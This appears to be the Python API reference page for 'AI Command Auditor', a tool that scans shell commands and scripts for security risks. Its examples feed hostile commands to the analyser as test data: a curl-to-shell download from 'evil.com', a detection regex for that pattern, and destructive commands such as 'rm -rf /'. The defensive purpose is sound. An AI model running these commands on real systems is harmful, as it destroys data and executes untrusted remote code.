---
layout: single
title: "Python API Reference"
description: "Complete Python API documentation for AI Command Auditor"
toc: true
toc_label: "Python API"
toc_icon: "code"
sidebar:
  nav: "docs"
---

# 🐍 Python API Reference

The AI Command Auditor Python API provides programmatic access to all command analysis, configuration management, and security validation features. This documentation covers the complete API with examples and best practices.

## 📦 Installation

```bash
# Install from PyPI
pip install ai-command-auditor

# Install with development dependencies
pip install "ai-command-auditor[dev]"

# Install from source
git clone https://github.com/etherisc/ai-command-auditor.git
cd ai-command-auditor
pip install -e .
```

## 🚀 Quick Start

```python
from ai_command_auditor import CommandAuditor, AuditResult

# Initialize auditor
auditor = CommandAuditor()

# Analyze a command
result = auditor.check_command("rm -rf /tmp/cache")
print(f"Risk Level: {result.risk_level}")
print(f"Safety Score: {result.safety_score}")

# Get recommendations
for recommendation in result.recommendations:
    print(f"- {recommendation}")
```

## 📚 Core Classes

### CommandAuditor

Main class for command analysis and auditing.

```python
class CommandAuditor:
    """
    Main auditor class for analyzing commands and scripts.

    Args:
        config_path (str, optional): Path to configuration file
        ai_provider (str, optional): AI provider to use ('openai', 'anthropic')
        security_level (str, optional): Security level ('basic', 'standard', 'strict')
    """

    def __init__(
        self,
        config_path: Optional[str] = None,
        ai_provider: Optional[str] = None,
        security_level: Optional[str] = None
    ):
        pass
```

#### Methods

##### check_command()

Analyze a single command for security risks.

```python
def check_command(
    self,
    command: str,
    context: Optional[Dict[str, Any]] = None,
    environment: Optional[str] = None,
    prompt_name: Optional[str] = None
) -> AuditResult:
    """
    Analyze a command for security risks and best practices.

    Args:
        command: The command string to analyze
        context: Additional context information
        environment: Environment context ('development', 'production')
        prompt_name: Specific AI prompt to use

    Returns:
        AuditResult: Analysis results

    Raises:
        CommandValidationError: If command is invalid
        AIAnalysisError: If AI analysis fails
    """
```

**Example:**

```python
from ai_command_auditor import CommandAuditor

auditor = CommandAuditor(security_level="strict")

# Basic analysis
result = auditor.check_command("sudo rm -rf /var/log/*")

# With context
result = auditor.check_command(
    "pip install requests",
    context={"project_type": "python", "requirements_locked": False},
    environment="production"
)

# With specific prompt
result = auditor.check_command(
    "docker run --privileged alpine",
    prompt_name="devops-security"
)

print(f"Risk: {result.risk_level}")
print(f"Score: {result.safety_score}/100")
for issue in result.issues:
    print(f"Issue: {issue.description}")
```

##### analyze_script()

Analyze entire script files.

```python
def analyze_script(
    self,
    script_path: str,
    script_type: Optional[str] = None,
    line_by_line: bool = False
) -> ScriptAuditResult:
    """
    Analyze a script file for security issues.

    Args:
        script_path: Path to the script file
        script_type: Script type ('bash', 'python', 'powershell')
        line_by_line: Analyze each line separately

    Returns:
        ScriptAuditResult: Script analysis results
    """
```

**Example:**

```python
# Analyze shell script
result = auditor.analyze_script("deploy.sh")

# Line-by-line analysis
result = auditor.analyze_script(
    "install.sh",
    line_by_line=True
)

# Python script
result = auditor.analyze_script(
    "setup.py",
    script_type="python"
)

print(f"Total issues: {len(result.issues)}")
print(f"Critical issues: {result.critical_count}")
print(f"Overall score: {result.overall_score}")

for line_result in result.line_results:
    if line_result.issues:
        print(f"Line {line_result.line_number}: {line_result.command}")
        for issue in line_result.issues:
            print(f"  - {issue.description}")
```

##### batch_analyze()

Analyze multiple commands or scripts in batch.

```python
def batch_analyze(
    self,
    items: List[Union[str, Dict[str, Any]]],
    parallel: bool = True,
    max_workers: Optional[int] = None
) -> List[AuditResult]:
    """
    Analyze multiple commands in batch.

    Args:
        items: List of commands or command dictionaries
        parallel: Enable parallel processing
        max_workers: Maximum number of worker threads

    Returns:
        List[AuditResult]: Results for each command
    """
```

**Example:**

```python
commands = [
    "rm -rf temp/",
    "sudo apt update",
    {"command": "pip install package", "context": {"environment": "production"}}
]

results = auditor.batch_analyze(commands, parallel=True)

for i, result in enumerate(results):
    print(f"Command {i+1}: {result.risk_level} risk")
```

### AuditResult

Contains the results of command analysis.

```python
@dataclass
class AuditResult:
    """Results from command analysis."""

    command: str
    risk_level: RiskLevel
    safety_score: int
    issues: List[SecurityIssue]
    recommendations: List[str]
    triggered_rules: List[str]
    ai_analysis: Optional[Dict[str, Any]]
    execution_time: float
    timestamp: datetime

    def is_safe(self) -> bool:
        """Check if command is considered safe."""
        return self.risk_level in [RiskLevel.LOW, RiskLevel.MEDIUM]

    def has_critical_issues(self) -> bool:
        """Check if any critical issues were found."""
        return any(issue.severity == Severity.CRITICAL for issue in self.issues)

    def get_fix_suggestions(self) -> List[str]:
        """Get automated fix suggestions."""
        return [issue.fix_suggestion for issue in self.issues if issue.fix_suggestion]
```

**Example:**

```python
result = auditor.check_command("rm -rf /")

# Check safety
if result.is_safe():
    print("Command is safe to execute")
else:
    print(f"Command has {result.risk_level} risk")

# Handle critical issues
if result.has_critical_issues():
    print("Critical security issues found!")
    for issue in result.issues:
        if issue.severity == Severity.CRITICAL:
            print(f"CRITICAL: {issue.description}")

# Get fix suggestions
fixes = result.get_fix_suggestions()
if fixes:
    print("Suggested fixes:")
    for fix in fixes:
        print(f"- {fix}")
```

### SecurityIssue

Represents a security issue found during analysis.

```python
@dataclass
class SecurityIssue:
    """Represents a security issue found in command analysis."""

    issue_id: str
    description: str
    severity: Severity
    category: str
    line_number: Optional[int]
    rule_triggered: Optional[str]
    fix_suggestion: Optional[str]
    explanation: str
    confidence: float
```

### Configuration

Manage auditor configuration programmatically.

```python
class Configuration:
    """Configuration management for AI Command Auditor."""

    def __init__(self, config_path: Optional[str] = None):
        """Initialize configuration."""

    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value."""

    def set(self, key: str, value: Any) -> None:
        """Set configuration value."""

    def load_from_file(self, file_path: str) -> None:
        """Load configuration from file."""

    def save_to_file(self, file_path: str) -> None:
        """Save configuration to file."""
```

**Example:**

```python
from ai_command_auditor import Configuration

config = Configuration()

# Get/set values
security_level = config.get("security.level", "standard")
config.set("ai.provider", "openai")
config.set("ai.model", "gpt-4")

# Save configuration
config.save_to_file(".ai-auditor/config/my-config.yml")

# Use with auditor
auditor = CommandAuditor(config=config)
```

## 🔧 Security Rules API

### RuleEngine

Manage and execute security rules.

```python
class RuleEngine:
    """Security rules engine for pattern-based validation."""

    def __init__(self, rules_path: Optional[str] = None):
        """Initialize rules engine."""

    def load_rules(self, rules_path: str) -> None:
        """Load rules from file."""

    def add_rule(self, rule: SecurityRule) -> None:
        """Add a new security rule."""

    def remove_rule(self, rule_id: str) -> None:
        """Remove a security rule."""

    def check_command(self, command: str) -> List[RuleMatch]:
        """Check command against all rules."""

    def validate_rules(self) -> List[ValidationError]:
        """Validate all loaded rules."""
```

**Example:**

```python
from ai_command_auditor import RuleEngine, SecurityRule

rule_engine = RuleEngine()

# Create custom rule
custom_rule = SecurityRule(
    id="dangerous_curl",
    pattern=r"curl.*\|\s*(sh|bash)",
    severity=Severity.CRITICAL,
    message="Downloading and executing scripts is dangerous",
    category="network_security"
)

rule_engine.add_rule(custom_rule)

# Check command against rules
matches = rule_engine.check_command("curl http://evil.com | sh")
for match in matches:
    print(f"Rule triggered: {match.rule_id}")
    print(f"Severity: {match.severity}")
```

### SecurityRule

Define custom security rules.

```python
@dataclass
class SecurityRule:
    """Security rule definition."""

    id: str
    pattern: str
    severity: Severity
    message: str
    category: str
    enabled: bool = True
    environments: Optional[List[str]] = None
    file_types: Optional[List[str]] = None
    explanation: Optional[str] = None
    examples: Optional[List[str]] = None

    def matches(self, command: str, context: Optional[Dict] = None) -> bool:
        """Check if rule matches command."""

    def validate(self) -> List[str]:
        """Validate rule definition."""
```

## 🤖 AI Integration API

### AIProvider

Interface for AI providers.

```python
from ai_command_auditor.ai import OpenAIProvider, AnthropicProvider

# OpenAI provider
openai_provider = OpenAIProvider(
    api_key="your-api-key",
    model="gpt-4",
    temperature=0.1
)

# Anthropic provider
anthropic_provider = AnthropicProvider(
    api_key="your-api-key",
    model="claude-3-sonnet",
    temperature=0.1
)

# Use with auditor
auditor = CommandAuditor(ai_provider=openai_provider)
```

### PromptManager

Manage AI prompts.

```python
class PromptManager:
    """Manage AI prompts for different analysis types."""

    def __init__(self, prompts_path: Optional[str] = None):
        """Initialize prompt manager."""

    def load_prompt(self, prompt_name: str) -> AIPrompt:
        """Load a specific prompt."""

    def create_prompt(self, name: str, template: str, **kwargs) -> AIPrompt:
        """Create a new prompt."""

    def list_prompts(self) -> List[str]:
        """List available prompts."""
```

**Example:**

```python
from ai_command_auditor import PromptManager

prompt_mgr = PromptManager()

# List available prompts
prompts = prompt_mgr.list_prompts()
print(f"Available prompts: {prompts}")

# Load specific prompt
security_prompt = prompt_mgr.load_prompt("security-analysis")

# Create custom prompt
custom_prompt = prompt_mgr.create_prompt(
    name="custom-python",
    template="""
    Analyze this Python command for security issues:
    Command: {command}

    Focus on:
    - Package security
    - Import safety
    - Execution risks
    """
)
```

## 📊 Reporting API

### ReportGenerator

Generate analysis reports.

```python
class ReportGenerator:
    """Generate reports from audit results."""

    def __init__(self, auditor: CommandAuditor):
        """Initialize report generator."""

    def generate_security_report(
        self,
        results: List[AuditResult],
        format: str = "html"
    ) -> str:
        """Generate security analysis report."""

    def generate_compliance_report(
        self,
        results: List[AuditResult],
        standards: List[str]
    ) -> str:
        """Generate compliance report."""

    def generate_trend_analysis(
        self,
        historical_data: List[AuditResult],
        period_days: int = 30
    ) -> Dict[str, Any]:
        """Generate trend analysis."""
```

**Example:**

```python
from ai_command_auditor import ReportGenerator

# Analyze multiple commands
commands = ["sudo rm -rf /", "pip install requests", "docker run alpine"]
results = [auditor.check_command(cmd) for cmd in commands]

# Generate reports
report_gen = ReportGenerator(auditor)

# HTML security report
html_report = report_gen.generate_security_report(results, format="html")
with open("security_report.html", "w") as f:
    f.write(html_report)

# Compliance report
compliance_report = report_gen.generate_compliance_report(
    results,
    standards=["SOX", "GDPR"]
)

# Trend analysis
trend_data = report_gen.generate_trend_analysis(historical_results)
print(f"Security trend: {trend_data['trend_direction']}")
```

## 🔗 Integration Helpers

### GitHookIntegration

Integrate with git hooks.

```python
class GitHookIntegration:
    """Git hooks integration for automatic validation."""

    def __init__(self, auditor: CommandAuditor):
        """Initialize git integration."""

    def setup_pre_commit_hook(self) -> None:
        """Setup pre-commit hook."""

    def setup_pre_push_hook(self) -> None:
        """Setup pre-push hook."""

    def validate_commit_commands(self, commit_sha: str) -> List[AuditResult]:
        """Validate commands in a commit."""
```

### CIIntegration

CI/CD pipeline integration.

```python
class CIIntegration:
    """CI/CD integration helpers."""

    @staticmethod
    def analyze_pipeline_script(script_path: str) -> Dict[str, Any]:
        """Analyze CI/CD pipeline script."""

    @staticmethod
    def fail_on_critical_issues(results: List[AuditResult]) -> None:
        """Fail CI if critical issues found."""

    @staticmethod
    def generate_ci_report(results: List[AuditResult]) -> str:
        """Generate CI-friendly report."""
```

**Example:**

```python
from ai_command_auditor import CIIntegration

# In CI pipeline
results = auditor.analyze_script("ci-deploy.sh")

# Fail if critical issues
try:
    CIIntegration.fail_on_critical_issues(results.to_audit_results())
    print("✅ Security validation passed")
except SecurityViolationError as e:
    print(f"❌ Security validation failed: {e}")
    exit(1)

# Generate CI report
report = CIIntegration.generate_ci_report(results.to_audit_results())
print(report)
```

## 🎯 Advanced Usage Patterns

### Custom Analysis Pipeline

```python
from ai_command_auditor import CommandAuditor, RuleEngine, PromptManager

class CustomAuditor:
    """Custom auditor with specialized analysis."""

    def __init__(self):
        self.auditor = CommandAuditor()
        self.rule_engine = RuleEngine()
        self.prompt_mgr = PromptManager()

        # Load custom rules
        self.rule_engine.load_rules("./custom-rules.yml")

    def analyze_with_context(self, command: str, project_type: str) -> AuditResult:
        """Analyze command with project-specific context."""

        # Select prompt based on project type
        prompt_map = {
            "python": "python-security",
            "nodejs": "web-development",
            "devops": "infrastructure-security"
        }

        prompt_name = prompt_map.get(project_type, "general-analysis")

        # Run analysis
        result = self.auditor.check_command(
            command,
            context={"project_type": project_type},
            prompt_name=prompt_name
        )

        # Add custom processing
        if project_type == "python" and "pip install" in command:
            result = self._enhance_python_analysis(result, command)

        return result

    def _enhance_python_analysis(self, result: AuditResult, command: str) -> AuditResult:
        """Add Python-specific analysis enhancements."""
        # Custom logic for Python package analysis
        return result
```

### Async Analysis

```python
import asyncio
from ai_command_auditor import AsyncCommandAuditor

async def analyze_commands_async():
    """Analyze commands asynchronously."""

    auditor = AsyncCommandAuditor()

    commands = [
        "rm -rf temp/",
        "sudo apt update",
        "pip install requests",
        "docker run alpine"
    ]

    # Analyze all commands concurrently
    tasks = [auditor.check_command(cmd) for cmd in commands]
    results = await asyncio.gather(*tasks)

    for i, result in enumerate(results):
        print(f"Command {i+1}: {result.risk_level}")

    await auditor.close()

# Run async analysis
asyncio.run(analyze_commands_async())
```

### Real-time Monitoring

```python
from ai_command_auditor import CommandMonitor
import time

class SecurityMonitor:
    """Real-time security monitoring."""

    def __init__(self):
        self.monitor = CommandMonitor()
        self.auditor = CommandAuditor()

    def start_monitoring(self):
        """Start monitoring command execution."""

        self.monitor.on_command_executed = self._on_command
        self.monitor.start()

    def _on_command(self, command: str, context: dict):
        """Handle executed command."""

        result = self.auditor.check_command(command, context)

        if result.has_critical_issues():
            self._alert_security_team(command, result)

        # Log all commands
        self._log_command_analysis(command, result)

    def _alert_security_team(self, command: str, result: AuditResult):
        """Send security alert."""
        print(f"🚨 SECURITY ALERT: {command}")
        print(f"Risk Level: {result.risk_level}")

    def _log_command_analysis(self, command: str, result: AuditResult):
        """Log command analysis."""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {command} -> {result.risk_level}")

# Start monitoring
monitor = SecurityMonitor()
monitor.start_monitoring()
```

## 🔧 Configuration Examples

### Environment-Specific Configuration

```python
from ai_command_auditor import CommandAuditor, Configuration

def create_production_auditor():
    """Create auditor configured for production."""

    config = Configuration()

    # Strict security settings
    config.set("security.level", "strict")
    config.set("security.block_critical", True)
    config.set("security.require_approval", True)

    # Conservative AI settings
    config.set("ai.temperature", 0.1)
    config.set("ai.model", "gpt-4")

    # Enable comprehensive logging
    config.set("logging.level", "info")
    config.set("logging.audit_trail", True)

    return CommandAuditor(config=config)

def create_development_auditor():
    """Create auditor configured for development."""

    config = Configuration()

    # Relaxed security settings
    config.set("security.level", "standard")
    config.set("security.block_critical", False)
    config.set("security.show_warnings", True)

    # Faster AI settings
    config.set("ai.temperature", 0.3)
    config.set("ai.model", "gpt-3.5-turbo")

    return CommandAuditor(config=config)

# Use environment-specific auditor
env = os.getenv("ENVIRONMENT", "development")
if env == "production":
    auditor = create_production_auditor()
else:
    auditor = create_development_auditor()
```

## ❌ Error Handling

### Exception Classes

```python
from ai_command_auditor.exceptions import (
    CommandValidationError,
    AIAnalysisError,
    ConfigurationError,
    SecurityViolationError,
    RuleValidationError
)

try:
    result = auditor.check_command("invalid command")
except CommandValidationError as e:
    print(f"Invalid command: {e}")
except AIAnalysisError as e:
    print(f"AI analysis failed: {e}")
except ConfigurationError as e:
    print(f"Configuration error: {e}")
except SecurityViolationError as e:
    print(f"Security violation: {e}")
    # Handle critical security issue
except Exception as e:
    print(f"Unexpected error: {e}")
```

### Graceful Degradation

```python
def safe_analysis(command: str) -> AuditResult:
    """Analyze command with fallback on errors."""

    try:
        # Try full AI analysis
        return auditor.check_command(command)
    except AIAnalysisError:
        # Fallback to rule-based analysis only
        rule_engine = RuleEngine()
        matches = rule_engine.check_command(command)

        # Create basic result from rules
        return AuditResult.from_rule_matches(command, matches)
    except Exception:
        # Ultimate fallback - basic safety check
        return AuditResult.create_unknown(command)
```

## 📚 Type Annotations

```python
from typing import Optional, List, Dict, Any, Union
from ai_command_auditor.types import (
    RiskLevel,
    Severity,
    SecurityIssue,
    AuditResult,
    ScriptAuditResult
)

def analyze_batch(
    auditor: CommandAuditor,
    commands: List[str],
    context: Optional[Dict[str, Any]] = None
) -> List[AuditResult]:
    """Type-annotated batch analysis function."""

    results: List[AuditResult] = []

    for command in commands:
        result: AuditResult = auditor.check_command(command, context)
        results.append(result)

    return results
```

## 🧪 Testing

### Unit Testing

```python
import unittest
from ai_command_auditor import CommandAuditor
from ai_command_auditor.testing import MockAIProvider

class TestCommandAuditor(unittest.TestCase):
    """Test command auditor functionality."""

    def setUp(self):
        # Use mock AI provider for testing
        mock_provider = MockAIProvider()
        self.auditor = CommandAuditor(ai_provider=mock_provider)

    def test_safe_command(self):
        """Test analysis of safe command."""
        result = self.auditor.check_command("ls -la")
        self.assertEqual(result.risk_level, RiskLevel.LOW)
        self.assertTrue(result.is_safe())

    def test_dangerous_command(self):
        """Test analysis of dangerous command."""
        result = self.auditor.check_command("rm -rf /")
        self.assertEqual(result.risk_level, RiskLevel.CRITICAL)
        self.assertTrue(result.has_critical_issues())

    def test_batch_analysis(self):
        """Test batch command analysis."""
        commands = ["ls", "rm -rf /tmp", "sudo reboot"]
        results = self.auditor.batch_analyze(commands)
        self.assertEqual(len(results), 3)
```

### Integration Testing

```python
from ai_command_auditor.testing import create_test_auditor

def test_real_ai_integration():
    """Test with real AI provider (requires API key)."""

    if not os.getenv("OPENAI_API_KEY"):
        pytest.skip("No API key for integration test")

    auditor = create_test_auditor(provider="openai")
    result = auditor.check_command("rm -rf /")

    assert result.risk_level == RiskLevel.CRITICAL
    assert len(result.issues) > 0
```

## 📖 Next Steps

- 🔗 [Integration Guide](/api/integration/) - Integrate with your applications
- 🎯 [Examples](/examples/) - Practical implementation examples
- 🔧 [CLI Reference](/api/cli/) - Command-line interface
- 🆘 [Troubleshooting](/support/troubleshooting/) - Common issues and solutions

<style>
table {
  width: 100%;
  margin: 1rem 0;
  border-collapse: collapse;
}

table th, table td {
  padding: 0.75rem;
  text-align: left;
  border-bottom: 1px solid #ddd;
}

table th {
  background-color: #f8f9fa;
  font-weight: 600;
}

.api-example {
  background-color: #f8f9fa;
  border-left: 4px solid #28a745;
  padding: 1rem;
  margin: 1rem 0;
}

.code-block {
  font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
  font-size: 0.9rem;
}

@media (max-width: 768px) {
  table {
    font-size: 0.9rem;
  }

  table th, table td {
    padding: 0.5rem;
  }
}
</style>
